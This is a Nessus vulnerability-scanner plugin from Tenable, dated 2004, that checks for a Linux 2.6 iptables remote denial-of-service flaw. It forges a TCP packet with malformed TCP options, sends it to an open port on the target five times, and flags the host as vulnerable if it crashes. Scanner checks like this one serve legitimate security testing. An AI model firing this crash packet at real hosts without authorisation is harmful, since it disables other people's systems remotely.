#
# (C) Tenable Network Security
#
#
# Ref:
# From: Adam Osuchowski <adwol-AT-polsl.gliwice.pl>
# To: bugtraq-AT-securityfocus.com
# Subject: Remote DoS vulnerability in Linux kernel 2.6.x
# Date: Wed, 30 Jun 2004 12:57:17 +0200
#


if (description)
{
 script_id(12296);
 script_bugtraq_id(10634);
 script_version ("$Revision: 1.4 $");
 script_name(english:"Linux 2.6 iptables sign error DoS");
 
 desc["english"] = "
It was possible to crash the remote host by sending a specially
malformed TCP/IP packet with invalid TCP options. Only the version
2.6 of the Linux Kernel is known to be affected by this problem.

An attacker may use this flaw to disable this host remotely.

Solution : Upgrade to Linux 2.6.7
Risk factor : High";

 script_description(english:desc["english"]);
 script_summary(english:"Crashes the remote host");
 script_category(ACT_KILL_HOST);
 script_family(english:"Denial of Service");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 exit(0);
}




if ( islocalhost() ) exit(0);


port = get_host_open_port();
if ( ! port ) port = 22;

ip = forge_ip_packet(ip_v:4, ip_hl:5, ip_tos:0,ip_off:0,ip_len:20,
                         ip_p:IPPROTO_TCP, ip_id:rand() % 65535, ip_ttl:0x40,
                         ip_src:this_host());


tcpip = forge_tcp_packet(    ip       : ip,
                             th_sport : rand() % 64000 + 1024,
                             th_dport : port,
                             th_flags : 0,
                             th_seq   : rand() % 65535,
                             th_ack   : 0,
                             th_x2    : 0,
                             th_off   : 7,
                             th_win   : 512,
                             th_urp   : 0,
                             data     : raw_string(0x02, 0x04, 0x05, 0xb4, 0x01, 0x01, 0x04, 0xfd) );


start_denial();
for ( i = 0 ; i < 5 ; i ++ ) send_packet ( tcpip, pcap_active:FALSE ) ;

alive = end_denial();
if ( ! alive )
{
 security_hole(0);
 set_kb_item(name:"Host/dead", value:TRUE);
}

